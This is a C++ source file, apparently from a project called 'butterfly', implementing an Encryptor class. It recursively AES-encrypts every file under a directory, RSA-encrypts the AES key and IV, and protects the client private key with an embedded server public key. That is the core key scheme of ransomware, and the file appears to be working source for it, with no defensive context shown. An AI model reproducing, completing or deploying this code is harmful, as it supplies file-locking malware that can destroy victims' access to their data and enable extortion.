
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize, const std::string &aesKeyDbFilepath) : _keySize(keySize), _aesKeyInit(false), _aesKeyDbFilepath(aesKeyDbFilepath),
                                                                         _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                                                         _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                                                         _aesEncryptor(new aes::AESEncryptor()),
                                                                         _dirIterator(new DirectoryIterator()),
                                                                         _aesKeyDatabase(new AESKeyDatabase(_aesKeyDbFilepath))
{
    LOG_TRACE("Create class Encryptor");
}

void Encryptor::validateAESKeyLength(std::string &aeskey, std::string &aesiv)
{

    do {

        if ( _aesKeyInit )
        {
            sleep(2);
        }

        if ( _aesEncryptor->generateAESKey() )
        {
            aeskey = _aesEncryptor->getAESKey();
            aesiv = _aesEncryptor->getAESIv();
            LOG_TRACE("Generating new AESKey with AESKEY Length: " << aeskey.length() << " and AESIV Length: " << aesiv.length());
            _aesKeyInit = true;
        } else
        {
            LOG_ERROR("Error on generating AES Key!")
        }

    } while ( (aeskey.length() < 32) or (aesiv.length() < 16));

}

void Encryptor::invokeDir(const std::string &path)
{
    // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
    encryptCPrivateRSA();

    // Get all files from provided directory path
    auto files =  _dirIterator->getAllFiles(path);

    // Generate and validate the AES Key and IV
    std::string aeskey, aesiv;
    validateAESKeyLength(aeskey, aesiv);

    // If --protect is enabled
    //LOG_TRACE("Length of AESKEY: " << aeskey.length() << " and length of AESIV: " << aesiv.length());
    //butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
    //butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));

    for (auto &file: files)
    {
        //LOG_TRACE("FILE: " << file);
        encryptFileWithAES(file.string());
    }

    // Save the final AESKey.bin file
    encryptFinalAESKeyWithRSA(aeskey, butterfly::ENC_AESKEY_FILENAME);
    // Save the final AESIV.bin file
    encryptFinalAESKeyWithRSA(aesiv, butterfly::ENC_AESIV_FILENAME);

}

void Encryptor::encryptCPrivateRSA()
{
    // Get the CPrivateRSA.pem file string
    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    try
    {
        // Encrypt the CPrivateRSA.pem file string
        _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::ENC_CPRIVATERSA_FILENAME);
        // Get the encrypted CPrivateRSA.pem string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
        // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));

    } catch (RSAEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFileWithAES(const std::string &filepath)
{

    try
    {
        // Encrypt the file with AES
        _aesEncryptor->encryptFile(filepath);

    } catch (AESEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename)
{

    try
    {
        // Encrypt the AES Key String
        _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, filename);
        // Get the encrypted AES Key String
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
        // Save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedMsgToFile(filename, aesKeyEnc, static_cast<int>(aesKeyEnc.length()));

    } catch (RSAEncryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        LOG_ERROR(e.what());
    }

}

} // namespace hybrid

} // namespace butterfly
